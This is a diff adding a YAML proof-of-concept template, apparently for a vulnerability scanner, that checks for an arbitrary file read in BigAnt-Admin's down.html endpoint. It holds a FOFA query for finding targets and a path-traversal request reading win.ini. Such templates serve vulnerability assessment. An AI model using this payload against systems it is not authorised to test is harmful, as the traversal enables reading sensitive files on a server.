@@ -1,0 +1,16 @@
+id: poc-yaml-jiuqitech-bigant-admin-down-html-anyfile-read
+info:
+  name: 九麒科技 BigAnt-Admin down.html 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: bigant-admin
+  fofa: app="BigAnt-Admin"
+requests:
+- method: GET
+  path: /Api/Update/down.html?file=../../../../../../../../windows/win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<") && contains(content_type,"application/octet-stream")
+    && contains(headers,"filename=win.ini")
+variables: {}
+transport: http
